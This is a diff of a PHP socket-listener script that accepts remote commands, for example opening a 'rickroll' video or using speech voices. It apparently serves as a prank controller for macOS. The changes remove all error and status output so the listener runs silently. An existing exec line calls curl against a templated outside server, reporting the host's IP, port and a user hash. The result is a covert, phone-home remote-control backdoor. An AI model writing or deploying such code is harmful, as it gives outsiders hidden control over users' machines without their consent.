@@ -31,30 +31,27 @@ if ($argc > 2) {
 }
 
 // Error check address and port
-(preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die("Invalid ip address: '{$address}'\n");
-(is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die("Invalid port: '{$port}'\n");
-
-echo "Creating say socket for address: $address through port: $port\n";
+(preg_match(REGEX_VALID_IP_ADDRESS, $address)) or die();
+(is_numeric($port) && $port > PORT_MIN && $port < PORT_MAX) or die();
 
 if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
-    die("socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n");
+    die();
 }
 
 if (socket_bind($sock, $address, $port) === false) {
     socket_close($sock);
-    die("socket_bind() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n");
+    die();
 }
 
 if (socket_listen($sock, 5) === false) {
     socket_close($sock);
-    die("socket_listen() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n");
+    die();
 }
 
 exec("curl -s \"{{SERVER_HOST}}m.php?ip=$address&port=$port&h={{USER_HASH}}\"");
 
 do {
     if (($msgsock = socket_accept($sock)) === false) {
-        echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
         break;
     }
 
@@ -67,7 +64,6 @@ do {
         $msg = '';
 
         if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
-            echo "socket_read() failed: reason: " . socket_strerror(socket_last_error($msgsock)) . "\n";
             break 2;
         }
 
@@ -87,7 +83,7 @@ do {
                 $buf = trim($buf, ' _-[]()"\'');
 
                 if (preg_match('/^rickroll$/i', $buf)) {
-                    $cmd = "open -a Safari 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'";
+                    $cmd = "open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'";
                     exec($cmd);
                 } else if (preg_match('/^voices$/i', $buf)) {
                     foreach ($voices as $voice) {
